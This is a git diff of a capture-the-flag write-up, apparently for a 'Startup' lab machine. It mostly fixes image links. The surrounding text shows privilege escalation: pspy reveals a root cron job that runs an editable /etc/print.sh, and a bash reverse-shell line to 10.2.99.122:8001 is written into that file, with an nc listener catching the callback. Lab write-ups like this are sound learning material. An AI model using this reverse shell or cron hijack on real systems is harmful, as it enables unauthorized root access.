@@ -303,19 +303,19 @@ Upload `pspy64` and run it. This monitors any commands or cronjobs run that is v
 file make a executable and run it. Wait for the cron to run and the pspy will show the result.
 
 <p align="left">
-<img src="/assets/img/startup/scp-psy.png" width="350"/>
+<img src="/assets/img/startup/change-dir-pspy.png" width="350"/>
 </p>
 
 > ./pspy64 
 
 <p align="left">
-<img src="/assets/img/startup/scp-psy.png" width="350"/>
+<img src="/assets/img/startup/pspy64.png" width="350"/>
 </p>
 
 ### analyse the pspy result
 
 <p align="left">
-<img src="/assets/img/startup/scp-psy.png" width="350"/>
+<img src="/assets/img/startup/cron-job.png" width="350"/>
 </p>
 
 If edit planner.sh with my a reverse shell, it wil gain root access. However, when trying to do, find that root owns the file and is the only user allowed to edit.
@@ -336,7 +336,7 @@ Looking at /etc/print.sh and find lennie is allowed to edit this file
 <img src="/assets/img/startup/ls-print.png" width="350"/>
 </p>
 
-Perfect, so I can edit this file and when root executes planner.sh it will then excute print.sh as the root user. I use Pentest Monkey Reverse Shell Cheatsheet for an already made reverse shell command, editing only my IP address
+Perfect, so I can edit this file and when root executes planner.sh it will then excute print.sh as the root user. I use Pentest Monkey Reverse Shell Cheatsheet for an already made reverse shell command, editing only local system IP address
 
 > echo 'bash -c "bash -i >& /dev/tcp/10.2.99.122/8001 0>&1"' > /etc/print.sh
 
@@ -344,9 +344,13 @@ set up a nc listener and wait around a minute for a callback
 
 > nc -lvnp 8001
 
-As root, I can now read root.txt
+<p align="left">
+<img src="/assets/img/startup/root-access.png" width="350"/>
+</p>
+
+As root, now read root.txt
 
 <p align="left">
-<img src="/assets/img/startup/ls-print.png" width="350"/>
+<img src="/assets/img/startup/root-texst.png" width="350"/>
 </p>
 
